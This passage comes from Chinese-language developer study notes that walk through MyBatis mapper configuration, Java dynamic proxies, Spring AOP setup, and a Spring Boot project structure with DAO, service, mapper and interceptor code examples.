class="string">&quot;mapper/UserMapper.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>UserMapper.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">    <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUser&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">stream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(stream);</span><br><span class="line"><span class="type">SqlSession</span> <span class="variable">session</span> <span class="operator">=</span> factory.openSession(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> session.getMapper(UserMapper.class);</span><br><span class="line"><span class="keyword">for</span>(User user: mapper.selectUser())&#123;</span><br><span class="line">    System.out.println(user.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session.close();</span><br></pre></td></tr></table></figure>


<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><ul>
<li>JavaSist - 基于字节码</li>
<li>Cglib - 基于类</li>
<li>基于接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 代理生成器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 被代理的接口</span></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTarget</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成一个代理类</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getProxy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="built_in">this</span>.getClass().getClassLoader(), target.getClass().getInterfaces(), <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理一个代理实例，并返回结果</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 调用特有行为</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="comment">// 调用特有行为</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 下方加入代理类特有行为</span></span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">    <span class="type">ProxyInvocationHandler</span> <span class="variable">proxyHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyInvocationHandler</span>();</span><br><span class="line">    <span class="comment">// 所代理的角色</span></span><br><span class="line">    proxyHandler.setTarget(hello);</span><br><span class="line">    <span class="comment">// 动态生成的代理类</span></span><br><span class="line">    <span class="type">Hello</span> <span class="variable">proxy</span> <span class="operator">=</span> (Hello) proxyHandler.getProxy();</span><br><span class="line">    proxy.say();  <span class="comment">// Hello 接口下的行为</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><p>导入包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">aspectjweaver</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log</span> <span class="keyword">implements</span> <span class="title class_">MethodBeforeAdvice</span>, AfterReturningAdvice &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">(Method method, Object[] args, Object target)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(target.getClass().getName() + <span class="string">&quot; - &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterReturning</span><span class="params">(Object returnValue, Method method, Object[] args, Object target)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>方式一：在Bean中注册Log</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 切入点 execution(访问权限 返回值 类名 方法名 参数) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在切入点加入 Log --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advicor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;log&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>方式二：使用类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PointCut</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> &#123;;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pcut&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;pcut&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 切入点 execution(访问权限 返回值 类名 方法名 参数) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;point&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 在切入点加入 Log --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;point&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:aspcet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>方式三：注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Aspcet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PointCut</span> &#123;</span><br><span class="line">    <span class="meta">@Before(&quot;execution(* com.UserServiceImpl.*(..))&quot;)</span> <span class="comment">// 别导错包</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> &#123;;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>后台：X-Admin</p>
<p>整合：</p>
<ul>
<li><p>数据库</p>
<ul>
<li>Mysql</li>
<li>Redis</li>
<li>ElasticSearch</li>
<li>ClickHouse</li>
</ul>
</li>
<li><p>数据库工具</p>
<ul>
<li>JDBC</li>
<li>Mybatis</li>
<li>MybatisPlus</li>
<li>JTA</li>
<li>Druid</li>
<li>Flyway</li>
<li>Jedis - Redis 客户端，非线程安全，除非使用线程池</li>
<li>Lettuce - Redis 客户端，线程安全</li>
<li>FastDFS</li>
</ul>
</li>
<li><p>安全</p>
<ul>
<li>JWT</li>
<li>Shiro</li>
<li>Security</li>
<li>OAuth2</li>
</ul>
</li>
<li><p>缓存日志</p>
<ul>
<li>Ehcache</li>
</ul>
</li>
<li><p>基础工具</p>
<ul>
<li>Zip4j</li>
<li>Lombok</li>
<li>Hutool</li>
<li>Fastjson</li>
<li>Guava</li>
<li>Commons-codes</li>
<li>Commons-pool</li>
<li>Commons-collections</li>
<li>Commons-lang3</li>
<li>Excel</li>
<li>PDF</li>
<li>Xml</li>
<li>CSV</li>
</ul>
</li>
<li><p>分布式</p>
<ul>
<li>Feign</li>
<li>Dubbo</li>
<li>Zookeeper</li>
<li>Spring Cloud</li>
<li>Nacos</li>
<li>Kafka</li>
<li>RocketMQ</li>
</ul>
</li>
<li><p>其他</p>
<ul>
<li><p>Swagger2</p>
</li>
<li><p>JavaMail</p>
</li>
<li><p>QuartJob</p>
</li>
<li><p>Drools</p>
</li>
<li><p>Elastic Job</p>
</li>
</ul>
</li>
</ul>
<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>Project</p>
<ul>
<li>config<ul>
<li>application.yaml  - 一级配置文件</li>
</ul>
</li>
<li>src<ul>
<li>main</li>
<li>test<ul>
<li>java<ul>
<li>com…<ul>
<li>xxxTests.java  - 测试文件</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>target  - 生成文件</li>
<li>application.yaml  - 二级配置文件</li>
<li>pom.xml  - 包管理文件</li>
</ul>
<p>其中<code>main</code>文件下（二者合并为<code>classpath</code>）：<br>main</p>
<ul>
<li>java<ul>
<li>com…<ul>
<li>common<ul>
<li>advice - 异常的处理<ul>
<li>BaseAdvice.java - 基础异常处理接口，例如：参数类型异常，未授权异常</li>
<li>OpenApiAdvice.java - API 请求异常处理类</li>
</ul>
</li>
<li>base - 数据基类，保存公共字段，实现序列化，分页等</li>
<li>config  - 配置<ul>
<li>SecurityConfig.java  - 安全配置、访问控制</li>
<li>InterceptorConfig.java</li>
<li>RedisConfig.java</li>
<li>MybatisPlusConfig.java</li>
<li>DruidDatasourceConfig.java</li>
</ul>
</li>
<li>intercepter<ul>
<li>LoginIntercepter.java - 登录拦截器</li>
</ul>
</li>
<li>exception <ul>
<li>BusinessException.java - 业务异常</li>
<li>UnauthorizedException.java - 未授权异常</li>
</ul>
</li>
<li>constant - 常量配置<ul>
<li>BooleanEnum.java</li>
<li>CodeEnum.java - 定义状态码</li>
</ul>
</li>
<li>service - 服务<ul>
<li>CacheService.java - 缓存服务，例如：Redis缓存服务</li>
</ul>
</li>
<li>utils - 工具类，例如：Zip，Http工具，IP工具等</li>
</ul>
</li>
<li>controller  - 负责渲染前端页面，或RESTful接口<ul>
<li>StudentDaoController.java</li>
<li>IndexController.java</li>
</ul>
</li>
<li>constant - 定义常量<ul>
<li>UrlConstant - url 常量</li>
<li>DemoCodeEnum - 返回码常量</li>
</ul>
</li>
<li>dao  - 提供增删改查的接口，要被 Spring 接管，可以用Mapper代替<ul>
<li>StudentDao.java</li>
</ul>
</li>
<li>mapper  - MyBatis 使用的查询接口，代替Dao<ul>
<li>StudentMapper.java</li>
</ul>
</li>
<li>pojo  - 实体类，与数据表保持一致<ul>
<li>vo</li>
<li>entity<ul>
<li>Student.java</li>
</ul>
</li>
</ul>
</li>
<li>service<ul>
<li>impl<ul>
<li>StudentServiceImpl.java  - 服务实现</li>
</ul>
</li>
<li>StudentService.java  - 服务接口</li>
</ul>
</li>
<li>MainApplication.java  - SpringBoot 启动类</li>
</ul>
</li>
</ul>
</li>
<li>resources<ul>
<li>db - 定义数据库迁移文件<ul>
<li>init</li>
</ul>
</li>
<li>config<ul>
<li>application.yaml</li>
</ul>
</li>
<li>i18n  - 国际化配置<ul>
<li>index.properties</li>
<li>index_zh_CN.properties</li>
<li>index_en_US.properties</li>
</ul>
</li>
<li>public<ul>
<li>index.html</li>
</ul>
</li>
<li>resources</li>
<li>static</li>
<li>mybatis<ul>
<li>mapper<ul>
<li>StudentMapper.xml</li>
</ul>
</li>
</ul>
</li>
<li>templates<ul>
<li>common  - 公共页面<ul>
<li>common.html</li>
</ul>
</li>
<li>error  - 错误页面<ul>
<li>404.html  - 404 错误页面</li>
</ul>
</li>
<li>student  - 管理页面，包括增删改查<ul>
<li>list.html</li>
<li>add.html</li>
<li>update.html</li>
</ul>
</li>
</ul>
</li>
<li>application.yaml</li>
<li>banner.txt  - SpringBoot 启动打印的logo</li>
</ul>
</li>
</ul>
<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 被 Spring 托管，可以用 @Autowired 装载的注解</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 功能组件</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Controller</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// 类上，用于注册配置类</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于方法上，注册一个基本组件</span></span><br><span class="line"><span class="meta">@Bean</span></span><br></pre></td></tr></table></figure>

<h2 id="主配置文件"><a href="#主配置文件" class="headerlink" title="主配置文件"></a>主配置文件</h2><p>配置文件名称必须为<code>application.yml</code>，不同环境可以配置不同的后缀，如<code>application-dev.yml</code>，<code>application-prod.yml</code>等。位置可以为</p>
<ul>
<li>&#x2F;config</li>
<li>&#x2F;</li>
<li>classpath:&#x2F;config</li>
<li>classpath:&#x2F;</li>
</ul>
<p>激活一个SpringBoot环境。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure>

<p>此外，配置文件可以与Bean绑定，让Bean自动获取yml文件中的配置。</p>
<p>例如，创建一个Bean，保存被拦截的路由。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;route&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Route</span> &#123;</span><br><span class="line">    String[] path;</span><br><span class="line">    String[] except;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件中配置相关值。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">route:</span></span><br><span class="line">  <span class="attr">path:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/users</span></span><br><span class="line">  <span class="attr">except:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/css</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/js</span></span><br></pre></td></tr></table></figure>

<p>再配置类中注册这个Bean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(Route.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RouteConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Route <span class="title function_">route</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Route</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再在拦截器中添加该路由。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Route routes;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        WebMvcConfigurer.<span class="built_in">super</span>.addInterceptors(registry);</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">LoginInterceptor</span>())</span><br><span class="line">                .addPathPatterns(routes.getPath())</span><br><span class="line">                .excludePathPatterns(routes.getExcept());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="数据对象"><a href="#数据对象" class="headerlink" title="数据对象"></a>数据对象</h2><p>创建一个Pojo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Lombok</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode(callSuper = true)</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="meta">@Data</span> <span class="comment">// 等于以上所有</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Builder</span> <span class="comment">// 静态构造器</span></span><br><span class="line"><span class="comment">// JSR303</span></span><br><span class="line"><span class="meta">@Validated</span></span><br><span class="line"><span class="comment">// MyBatis Plus</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;tb_demo_car&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123; <span class="comment">// Serializable 使 Redis 能够存储该对象</span></span><br><span class="line">    <span class="meta">@TableId(type = IdType.AUTO)</span>  <span class="comment">// MyBatis Plus</span></span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@PositiveOrZero()</span>  <span class="comment">// 验证机制 JSR303</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="meta">@Email()</span>  <span class="comment">// 验证机制 JSR303</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建传统Dao</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Repository</span>  <span class="comment">// 被 Spring 托管，可以用 @Autowired 装载</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentDao</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;Integer, Student&gt; students = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        students = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        students.put(<span class="number">100</span>, <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">100</span>, <span class="string">&quot;name-dog-1&quot;</span>, <span class="number">10</span>, <span class="string">&quot;12345@qq.com&quot;</span>));</span><br><span class="line">        students.put(<span class="number">101</span>, <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">101</span>, <span class="string">&quot;name-dog-2&quot;</span>, <span class="number">15</span>, <span class="string">&quot;54321@qq.com&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Collection&lt;Student&gt; <span class="title function_">getAllStudents</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> students.values();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">getStudentById</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> students.get(id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">save</span><span class="params">(Student student)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">update</span><span class="params">(Student student)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">delete</span><span class="params">(Integer integer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建Service</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    String <span class="title function_">getNameById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">    Student <span class="title function_">getStudentByName</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    StudentMapper studentMapper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNameById</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> studentMapper.getNameById(id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">getStudentByName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> studentMapper.getStudentByName(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于JDBC Template，使用User对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;Long&gt; users = jdbcTemplate.queryForList(<span class="string">&quot;select id from user&quot;</span>, Long.class);</span><br><span class="line">    System.out.println(users.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果使用MyBatis，则设置Mapper，而不必使用DAO。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line">    List&lt;Student&gt; <span class="title function_">listStudents</span><span class="params">()</span>;</span><br><span class="line">    Student <span class="title function_">listStudentById</span><span class="params">(Integer id)</span>;</span><br><span class="line">    String <span class="title function_">getNameById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">    Student <span class="title function_">getStudentByName</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">addStudent</span><span class="params">(Student student)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">updateStudent</span><span class="params">(Student student)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">deleteStudent</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.demox.mapper.StudentMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;StudentResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.example.demox.pojo.Student&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;listStudents&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;StudentResultMap&quot;</span>&gt;</span></span><br><span class="line">        select id, name, age from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getNameById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;_int&quot;</span>&gt;</span></span><br><span class="line">        select name from user where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getStudentByName&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Student&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span>&gt;</span></span><br><span class="line">        select * from user where name=#&#123;name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以不用注解，而是在项目启动位置加入：</p>
